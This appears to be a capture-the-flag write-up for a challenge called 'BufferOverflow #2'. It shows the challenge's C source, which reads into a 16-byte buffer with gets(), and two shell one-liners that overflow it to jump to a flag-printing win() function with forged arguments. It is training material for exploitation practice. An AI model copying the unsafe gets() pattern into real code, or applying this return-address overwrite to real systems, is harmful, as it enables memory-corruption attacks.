# BufferOverflow #2

<img src="bufo2.png"><br>
<img src="bufo2d.png"><br>

```
#include <stdio.h>
#include <stdlib.h>

void win(long long arg1, int arg2)
{
	if (arg1 != 0x14B4DA55 || arg2 != 0xF00DB4BE)
	{
		puts("Close, but not quite.");
		exit(1);
	}

	printf("You win!\n");
	char buf[256];
	FILE* f = fopen("./flag.txt", "r");
	if (f == NULL)
	{
		puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
	}
	else
	{
		fgets(buf, sizeof(buf), f);
		printf("flag: %s\n", buf);
	}
}

void vuln()
{
	char buf[16];
	printf("Type something>");
	gets(buf);
	printf("You typed %s!\n", buf);
}

int main()
{
	/* Disable buffering on stdout */
	setvbuf(stdout, NULL, _IONBF, 0);

	vuln();
	return 0;
}
```

<br>


```
for i in {1..50}; do echo $i; python -c "print 'A'*$i+'\xc2\x91\x04\x08'"| ./bufover-2 ;done
```

<br>

```
for i in {1..50}; do echo $i; python -c "print 'A'*28+'\xc2\x91\x04\x08' + 'A'*$i + '\x55\xDA\xB4\x14\x00\x00\x00\x00\xBE\xB4\x0D\xF0'"| ./bufover-2 ;done
```
